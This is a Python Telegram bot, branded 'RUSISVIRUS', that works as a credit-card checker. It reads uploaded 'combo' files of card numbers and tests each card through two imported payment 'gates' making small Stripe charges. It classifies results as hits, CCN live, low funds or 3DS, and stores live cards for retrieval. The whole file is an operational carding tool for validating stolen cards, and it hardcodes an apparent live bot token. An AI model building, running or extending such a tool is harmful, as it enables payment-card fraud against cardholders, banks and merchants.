import requests
import telebot, time, threading
from telebot import types
# 🔥 IMPORT BOTH GATES
from gate1 import Tele as Gate1
from gate2 import Tele as Gate2

import os
from func_timeout import func_timeout, FunctionTimedOut

token = '7957655626:AAEUuz6g8x5tY4k3yZz1EFp_tWL2Ov5Zt44'
bot = telebot.TeleBot(token, parse_mode="HTML")

ALLOWED_IDS = ['1915369904', '7103090839']

# ==========================================
# 🔥 DOUBLE CHECK FUNCTION
# ==========================================
def check_double_gate(cc):
    # -------------------------------------
    # 1️⃣ Gate 1 Check
    # -------------------------------------
    try:
        last = str(func_timeout(100, Gate1, args=(cc,)))
    except:
        last = 'Error'

    # 🔥 Check for Approved OR 3Ds in Gate 1
    if "Payment Successful!" in last or "funds" in last or "security code" in last:
        return f"{last} (Gate 1 ✅)"
    elif "authenticate" in last or "3d_secure" in last:
        return f"{last} (Gate 1 - 3Ds 🔐)"
    
    # -------------------------------------
    # 2️⃣ Gate 2 Check
    # -------------------------------------
    else:
        try:
            # Gate 1 Failed -> Checking Gate 2
            last2 = str(func_timeout(100, Gate2, args=(cc,)))
        except:
            last2 = 'Error'

        if "Donation Successful!" in last2 or "funds" in last2 or "security code" in last2:
            return f"{last2} (Gate 2 ✅)"
        elif "authenticate" in last2 or "3d_secure" in last2:
            return f"{last2} (Gate 2 - 3Ds 🔐)"
        else:
            return "Decline⛔"

# ==========================================
# 🎨 DASHBOARD UI
# ==========================================
def get_dashboard_ui(total, current, live, die, ccn, low, cvv, threeds, last_cc, last_response):
    percent = int((current / total) * 100) if total > 0 else 0
    display_cc = last_cc if len(last_cc) >= 10 else "Wait..."
    display_response = (last_response[:30] + "...") if len(last_response) > 30 else last_response
    
    line = "━━━━━━━━━━━━━━━━━━"
    text = (
        f"{line}\n"
        f"• <b>RUSISVIRUS | DUAL GATE 🇲🇲</b>\n"
        f"{line}\n"
        f"• <code>{display_cc}</code>\n"
        f"• <b>Status:</b> {display_response}\n"
        f"• <b>Gate 1 ($0.5) ➜ Gate 2 ($0.7)</b>\n"
        f"{line}\n"
        f"• <b>Hits:</b> {live}    • <b>Dead:</b> {die}\n"
        f"• <b>CVV:</b>  {cvv}    • <b>CCN:</b>  {ccn}\n"
        f"• <b>Low:</b>   {low}    • <b>3Ds:</b>   {threeds}\n" 
        f"{line}\n"
        f"• <b>Processing...</b> {percent}%"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⛔ STOP", callback_data="stop"))
    return text, markup

# ==========================================
# 🤖 COMMANDS
# ==========================================
@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in ALLOWED_IDS: return
    bot.reply_to(message, "Send your Combo File! 🚀")

# 🔥 COMMAND: GET LIVES FILE (/gfemin)
@bot.message_handler(commands=["gfemin"])
def send_hits_file(message):
    if str(message.chat.id) not in ALLOWED_IDS: return
    try:
        doc = open("cc.txt", "rb")
        bot.send_document(message.chat.id, doc, caption="<b>✅ Here are your Hits (Approved + Low Funds)</b>")
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ No hits found yet!")
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) not in ALLOWED_IDS: return
    t = threading.Thread(target=run_checker, args=(message,))
    t.start()

# ==========================================
# 🚀 CHECKER LOGIC
# ==========================================
def run_checker(message):
    dd = 0; live = 0; ch = 0; ccn = 0; cvv = 0; lowfund = 0; threeds = 0
    chat_id = message.chat.id
    file_name = f"combo_{chat_id}_{int(time.time())}.txt"
    stop_file = f"stop_{chat_id}.stop"

    try:
        ko = bot.reply_to(message, "𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐃𝐮𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐫! 🚀").message_id
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        with open(file_name, "wb") as w: w.write(ee)
            
        with open(file_name, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            view_text, markup = get_dashboard_ui(total, 0, 0, 0, 0, 0, 0, 0, "Wait...", "Starting...")
            bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)

            for index, cc in enumerate(lino, 1):
                cc = cc.strip()
                if os.path.exists(stop_file): break

                # BIN Lookup
                try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                except: data = {}
                brand = data.get('brand','Unknown')
                card_type = data.get('type','Unknown')
                country = data.get('country_name','Unknown')
                country_flag = data.get('country_flag', '')
                bank = data.get('bank','Unknown') 

                start_time = time.time()
                last = check_double_gate(cc)
                execution_time = time.time() - start_time
                
                # Update Dashboard UI
                if "Successful" in last or "funds" in last or "security code" in last or "3Ds" in last or (index%8==0):
                    view_text, markup = get_dashboard_ui(total, index, ch, dd, ccn, lowfund, cvv, threeds, cc, last)
                    try: bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                    except: pass
                
                print(f"{cc} -> {last}")

                if "Gate 1" in last: gate_display = "Stripe 0.5$"
                elif "Gate 2" in last: gate_display = "Stripe 0.7$"
                else: gate_display = "Auth / Charge"

                # ---------------------------------------------
                # 🟢 RESULT MESSAGES (COMPACT LAYOUT)
                # ---------------------------------------------
                
                # 1. APPROVED / CHARGED
                if 'Successful' in last:
                    ch += 1
                    with open("cc.txt", "a") as f: f.write(f"{cc} - {last}\n")
                    
                    msg = f'''💀 <b>HIT DETECTED</b> 💀
━━━━━━━━━━━━━━
• <code>{cc}</code>
🩸 <b>Response:</b> APPROVED! 🔥
━━━━━━━━━━━━━━
🕸 <b>Type:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🗺 <b>Region:</b> {country} {country_flag}
🔪 <b>Gate:</b> {gate_display}
⏳ <b>Time:</b> {execution_time:.1f}s
━━━━━━━━━━━━━━
👤 <b>Dev: @Rusisvirus</b>'''
                    bot.send_message(message.chat.id, msg)
                
                # 2. CCN LIVE
                elif 'security code' in last:
                    ccn += 1
                    msg = f'''💀 <b>HIT DETECTED</b> 💀
━━━━━━━━━━━━━━
• <code>{cc}</code>
🩸 <b>Response:</b> CCN LIVE ✅
━━━━━━━━━━━━━━
🕸 <b>Type:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🗺 <b>Region:</b> {country} {country_flag}
🔪 <b>Gate:</b> {gate_display}
⏳ <b>Time:</b> {execution_time:.1f}s
━━━━━━━━━━━━━━
👤 <b>Dev: @Rusisvirus</b>'''
                    bot.send_message(message.chat.id, msg)
                    
                # 3. LOW FUNDS
                elif 'funds' in last:
                    lowfund += 1
                    with open("cc.txt", "a") as f: f.write(f"{cc} - {last}\n")

                    msg = f'''💀 <b>HIT DETECTED</b> 💀
━━━━━━━━━━━━━━
• <code>{cc}</code>
🩸 <b>Response:</b> LOW FUNDS 💰
━━━━━━━━━━━━━━
🕸 <b>Type:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🗺 <b>Region:</b> {country} {country_flag}
🔪 <b>Gate:</b> {gate_display}
⏳ <b>Time:</b> {execution_time:.1f}s
━━━━━━━━━━━━━━
👤 <b>Dev: @Rusisvirus</b>'''
                    bot.send_message(message.chat.id, msg)

                # 4. 3D SECURE
                elif '3Ds' in last or 'authenticate' in last:
                    threeds += 1
                    msg = f'''🔐 <b>3D SECURE REQUIRED</b> 🔐
━━━━━━━━━━━━━━
• <code>{cc}</code>
🩸 <b>Response:</b> 3Ds / OTP REQUESTED 📱
━━━━━━━━━━━━━━
🕸 <b>Type:</b> {brand} - {card_type}
🏛 <b>Bank:</b> {bank}
🗺 <b>Region:</b> {country} {country_flag}
🔪 <b>Gate:</b> {gate_display}
⏳ <b>Time:</b> {execution_time:.1f}s
━━━━━━━━━━━━━━
👤 <b>Dev: @Rusisvirus</b>'''
                    bot.send_message(message.chat.id, msg)
                
                else:
                    dd += 1
        
        if os.path.exists(file_name): os.remove(file_name)
        bot.edit_message_text(chat_id=chat_id, message_id=ko, text='✅ <b>Dual Checking Completed!</b>')

    except Exception as e: print(e)

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    stop_file = f"stop_{call.message.chat.id}.stop"
    with open(stop_file, "w") as file: pass
    bot.answer_callback_query(call.id, "Stopping...")

print("🤖 Dual-Gate Bot Started...")
bot.infinity_polling()
